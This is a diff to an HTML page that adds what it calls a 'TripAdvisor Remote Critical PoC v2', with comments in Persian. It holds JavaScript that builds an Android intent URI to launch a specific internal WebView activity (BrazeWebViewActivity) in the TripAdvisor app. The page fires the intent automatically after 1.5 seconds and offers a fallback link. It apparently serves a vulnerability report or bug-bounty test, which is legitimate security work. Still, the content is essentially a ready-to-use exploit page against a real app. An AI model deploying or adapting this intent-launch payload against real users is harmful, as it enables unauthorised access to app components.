@@ -22,5 +22,32 @@
         // بعد از ۲ ثانیه به طور خودکار اجرا شود (برای PoC قوی‌تر)
         setTimeout(triggerIntent, 2000);
     </script>
+
+
+    
+    <h1>🚨 TripAdvisor Remote Critical PoC v2</h1>
+    <p>کلیک کن تا صفحه Review (authenticated) در TripAdvisor باز شود</p>
+
+    <button onclick="triggerFullIntent()">Open in TripAdvisor (Intent)</button><br>
+    <button onclick="triggerFallback()" class="fallback">Fallback: Direct Link</button>
+
+    <script>
+        function triggerFullIntent() {
+            // روش کامل و قوی intent
+            window.location = "intent:#Intent;action=android.intent.action.VIEW;package=com.tripadvisor.tripadvisor;component=com.tripadvisor.tripadvisor/com.braze.ui.BrazeWebViewActivity;S.url=https://www.tripadvisor.com/UserReview;end";
+        }
+
+        function triggerFallback() {
+            // fallback مستقیم (تست شده و کار می‌کند)
+            window.location = "https://www.tripadvisor.com/UserReview";
+        }
+
+        // بعد از ۱.۵ ثانیه خودکار Intent را امتحان کن
+        setTimeout(triggerFullIntent, 1500);
+    </script>
 </body>
 </html>
+
+
+<!DOCTYPE html>
+
